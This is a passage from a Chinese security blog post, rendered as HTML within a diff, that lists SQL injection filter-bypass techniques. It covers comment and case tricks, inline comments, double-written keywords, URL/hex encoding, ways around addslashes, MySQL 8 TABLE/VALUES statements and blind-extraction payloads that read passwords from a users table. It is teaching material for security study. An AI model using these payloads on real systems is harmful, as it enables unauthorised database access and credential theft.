+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p><code>/*! */</code> 是有条件的注释形式，可以在其中包含 MySQL 特定的指令，以及版本号和条件语句等。如果指令在当前 MySQL 版本下可用，那么它将被执行，否则将被忽略。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.注释符
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">//</span>、<span style="color:#828b96;font-style:italic">--、/**/、#、--+、---、;、%00、--a
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">U</span><span style="color:#828b96;font-style:italic">/**/</span> <span style="color:#58a1dd">NION</span> <span style="color:#828b96;font-style:italic">/**/</span> <span style="color:#58a1dd">SE</span><span style="color:#828b96;font-style:italic">/**/</span> <span style="color:#58a1dd">LECT</span> <span style="color:#828b96;font-style:italic">/**/</span><span style="color:#ff636f">user</span>，<span style="color:#58a1dd">pwd</span> <span style="color:#ff636f">from</span> <span style="color:#ff636f">user</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.大小写
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=-</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39;UnIoN/**/SeLeCT
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">3.内联注释
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">id=-1&#39;</span><span style="color:#828b96;font-style:italic">/*!UnIoN*/</span> <span style="color:#ff636f">SeLeCT</span> <span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#58a1dd">concat</span>(<span style="color:#828b96;font-style:italic">/*!table_name*/</span>) <span style="color:#ff636f">FrOM</span> <span style="color:#828b96;font-style:italic">/*information_schema*/</span>.<span style="color:#58a1dd">tables</span> <span style="color:#828b96;font-style:italic">/*!WHERE *//*!TaBlE_ScHeMa*/</span> <span style="color:#ff636f">like</span> <span style="color:#ff636f">database</span>()<span style="color:#ff636f">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.双写 <span style="color:#ff636f">#</span> 删除的<span style="color:#58a1dd">waf下</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=-</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39;UNIunionONSeLselectECT1,2,3–-
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">5.+号
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">6.语法新特性
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">MySQL 8.0.19版本后可以不用select</span></span></span></code></pre></div><p>子查询绕过union</p>
+<p>假设有一个被过滤了&quot;UNION&quot;的查询：</p>
+<pre tabindex="0"><code>SELECT id, name FROM table1 WHERE id = 1 UNION SELECT id, name FROM table2 WHERE id = 2;</code></pre><p>您可以尝试使用子查询：</p>
+<pre tabindex="0"><code>SELECT id, name FROM table1 WHERE id = 1 OR id = (SELECT id FROM table2 WHERE id = 2);</code></pre><h5 id="concat" class="heading-element"><span>0.0.0.10  CONCAT</span>
+  <a href="#concat" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>SELECT CONCAT(&#39;I&#39;, IF(1, CONCAT(&#39;sle&#39;, &#39;ep&#39;(5)), 1))</code></pre><h5 id="if" class="heading-element"><span>0.0.0.11  if</span>
+  <a href="#if" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>假设我们有一个名为<code>employees</code>的表，其中包含雇员的信息，包括<code>employee_id</code>、<code>first_name</code>、<code>last_name</code>、<code>salary</code>和<code>department_id</code>字段。我们想根据雇员的薪水情况添加一个名为<code>salary_category</code>的新列，将薪水划分为&quot;高&quot;、&ldquo;中&quot;和&quot;低&quot;三个类别。</p>
+<p>我们可以使用CASE语句来实现这个逻辑，如下所示：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">SELECT</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">employee_id</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">first_name</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">last_name</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">salary</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">department_id</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">CASE</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">WHEN</span> <span style="color:#58a1dd">salary</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">5000</span> <span style="color:#ff636f">THEN</span> <span style="color:#a6be9d">&#39;高&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">WHEN</span> <span style="color:#58a1dd">salary</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">3000</span> <span style="color:#ff636f">THEN</span> <span style="color:#a6be9d">&#39;中&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">ELSE</span> <span style="color:#a6be9d">&#39;低&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">END</span> <span style="color:#ff636f">AS</span> <span style="color:#58a1dd">salary_category</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">FROM</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">employees</span>;</span></span></code></pre></div><h5 id="绕过addslashes函数" class="heading-element"><span>0.0.0.12  绕过addslashes()函数</span>
+  <a href="#%e7%bb%95%e8%bf%87addslashes%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>addslashes()函数的作用是在单引号(&rsquo;)、双引号(&quot;)、反斜杠()和NULL前加上反斜杠，这样可以绕过大部分的恶意SQL注入。但是在某些情况下，该函数会失灵。</p>
+</blockquote>
+<ul>
+<li>第一种情况是数字型注入</li>
+</ul>
+<p>数字型参数往往不需要用单引号(&rsquo;)闭合，比如select productname from product where productID=1 and 1=1.因为SQL语句没有单引号，故攻击者只需在后面加上注入语句，addslashes()函数对这些语句是不起作用的。</p>
+<p>防御的方法是用==intval()函数==进行强制转换。</p>
+<ul>
+<li>第二种情况是宽字节注入</li>
+</ul>
+<p>简单的说有两种情况可能会造成宽字节注入，首先是设置数据库的字符集为gbk，或者是在使用iconv,mb_convert_encoding转换字符编码函数导致宽字节注入，具体的去看常用姿势-&gt;宽字节</p>
+<ul>
+<li>第三种情况是可控做了addslashes之后，可控变量进入了各种函数比如,base64_decode,urldecode,json_encode,stripslashes</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">urldecode</span>(<span style="color:#58a1dd">$userid</span>) <span style="color:#828b96;font-style:italic">//注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码，双重编码来绕过addslashes
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">rawurldecode</span>(<span style="color:#58a1dd">$userid</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">base64_decode</span>(<span style="color:#58a1dd">$userid</span>) <span style="color:#828b96;font-style:italic">//首先通过addslashes()过滤，然后urlencode解码
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">json_encode</span>(<span style="color:#58a1dd">$userid</span>) <span style="color:#828b96;font-style:italic">//该函数把转换为\，两个反斜杠抵消。
+</span></span></span></code></pre></div><ul>
+<li>
+<p>第四种是字符截断绕过addslashes</p>
+<p>可以参考这个CTF题目，是具体业务代码产生的漏洞</p>
+<p><a href="https://mayi077.gitee.io/2020/05/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%89%B9%E5%AE%9A%E5%9C%BA%E5%90%88%E4%B8%8Baddslashes%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87/"target="_blank" rel="external nofollow noopener noreferrer">https://mayi077.gitee.io/2020/05/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%89%B9%E5%AE%9A%E5%9C%BA%E5%90%88%E4%B8%8Baddslashes%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">sanitizeInput</span>(<span style="color:#58a1dd">$input</span>, <span style="color:#58a1dd">$length</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">20</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$input</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">addslashes</span>(<span style="color:#58a1dd">$input</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">strlen</span>(<span style="color:#58a1dd">$input</span>) <span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">$length</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#58a1dd">$input</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">substr</span>(<span style="color:#58a1dd">$input</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">$length</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$input</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></li>
+</ul>
+<h5 id="mysql8" class="heading-element"><span>0.0.0.13  Mysql8</span>
+  <a href="#mysql8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>MySQL 8.0.19版本后可以不用select</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">TABLE</span> 语句
+</span></span><span style="display:flex;"><span>可以直接列出表的全部内容
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">TABLE</span> <span style="color:#ff636f">table_name</span> [<span style="color:#ff636f">ORDER</span> <span style="color:#ff636f">BY</span> <span style="color:#ff636f">column_name</span>] [<span style="color:#ff636f">LIMIT</span> <span style="color:#58a1dd">number</span> [<span style="color:#ff636f">OFFSET</span> <span style="color:#58a1dd">number</span>]]
+</span></span><span style="display:flex;"><span>如 <span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#ff636f">user</span> 就可以用 <span style="color:#ff636f">table</span> <span style="color:#ff636f">user</span> 替代来进行绕过</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">VALUES</span> 语句
+</span></span><span style="display:flex;"><span>可以列出一行的值
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">VALUES</span> <span style="color:#58a1dd">row_constructor_list</span> [<span style="color:#ff636f">ORDER</span> <span style="color:#ff636f">BY</span> <span style="color:#58a1dd">column_designator</span>] [<span style="color:#ff636f">LIMIT</span> <span style="color:#ff636f">BY</span> <span style="color:#58a1dd">number</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">VALUES</span> <span style="color:#ff636f">ROW</span>(<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>), <span style="color:#ff636f">ROW</span>(<span style="color:#a6be9d">4</span>,<span style="color:#a6be9d">5</span>,<span style="color:#a6be9d">6</span>);</span></span></code></pre></div><h5 id="其他" class="heading-element"><span>0.0.0.14  其他</span>
+  <a href="#%e5%85%b6%e4%bb%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="编码" class="heading-element"><span>0.0.0.14.1  编码</span>
+  <a href="#%e7%bc%96%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p>
+<p>or 1=1<code>即</code>%6f%72%20%31%3d%31<code>，而</code>Test<code>也可以为</code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h6 id="等价函数" class="heading-element"><span>0.0.0.14.2  等价函数</span>
+  <a href="#%e7%ad%89%e4%bb%b7%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">hex</span>()、<span style="color:#58a1dd">bin</span>() <span style="color:#ff636f">==&gt;</span> <span style="color:#58a1dd">ascii</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sleep</span>() <span style="color:#ff636f">==&gt;</span><span style="color:#58a1dd">benchmark</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">concat_ws</span>()<span style="color:#ff636f">==&gt;</span><span style="color:#58a1dd">group_concat</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mid</span>()、<span style="color:#58a1dd">substr</span>() <span style="color:#ff636f">==&gt;</span> <span style="color:#ff636f">substring</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">@@</span><span style="color:#ff636f">user</span> <span style="color:#ff636f">==&gt;</span> <span style="color:#ff636f">user</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">@@</span><span style="color:#58a1dd">datadir</span> <span style="color:#ff636f">==&gt;</span> <span style="color:#58a1dd">datadir</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>举例：<span style="color:#ff636f">substring</span>()和<span style="color:#58a1dd">substr</span>()无法使用时：<span style="color:#ff636f">?</span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">+</span><span style="color:#ff636f">and</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">ascii</span>(<span style="color:#ff636f">lower</span>(<span style="color:#58a1dd">mid</span>((<span style="color:#ff636f">select</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">pwd</span><span style="color:#ff636f">+</span><span style="color:#ff636f">from</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">users</span><span style="color:#ff636f">+</span><span style="color:#ff636f">limit</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>),<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>)))<span style="color:#ff636f">=</span><span style="color:#a6be9d">74</span>　
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>或者：
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">substr</span>((<span style="color:#ff636f">select</span> <span style="color:#a6be9d">&#39;password&#39;</span>),<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>) <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span><span style="color:#58a1dd">x70</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">strcmp</span>(<span style="color:#ff636f">left</span>(<span style="color:#a6be9d">&#39;password&#39;</span>,<span style="color:#a6be9d">1</span>), <span style="color:#a6be9d">0</span><span style="color:#58a1dd">x69</span>) <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">strcmp</span>(<span style="color:#ff636f">left</span>(<span style="color:#a6be9d">&#39;password&#39;</span>,<span style="color:#a6be9d">1</span>), <span style="color:#a6be9d">0</span><span style="color:#58a1dd">x70</span>) <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">strcmp</span>(<span style="color:#ff636f">left</span>(<span style="color:#a6be9d">&#39;password&#39;</span>,<span style="color:#a6be9d">1</span>), <span style="color:#a6be9d">0</span><span style="color:#58a1dd">x71</span>) <span style="color:#ff636f">=</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span></span></span></code></pre></div><h6 id="多语句" class="heading-element"><span>0.0.0.14.3  多语句</span>
+  <a href="#%e5%a4%9a%e8%af%ad%e5%8f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>或者可以使用多语句的方式执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">set</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">a</span>:<span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span><span style="color:#58a1dd">x73656c656374202a2066726f6d2074657374</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">prepare</span> <span style="color:#58a1dd">s</span> <span style="color:#ff636f">from</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">a</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">execute</span> <span style="color:#58a1dd">s</span>;</span></span></code></pre></div><p>也可以</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">handler</span> <span style="color:#ff636f">user</span> <span style="color:#ff636f">open</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">handler</span> <span style="color:#ff636f">user</span> <span style="color:#ff636f">read</span> <span style="color:#ff636f">first</span>;</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="post-tag" title="Tags - SQL注入">SQL注入</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/sql%E6%B3%A8%E5%85%A5/118/" class="post-nav-item" rel="prev" title="SQL注入-Mysql8新特性"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SQL注入-Mysql8新特性</a>
+      <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93/79/" class="post-nav-item" rel="next" title="Sqlserver学习">Sqlserver学习<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
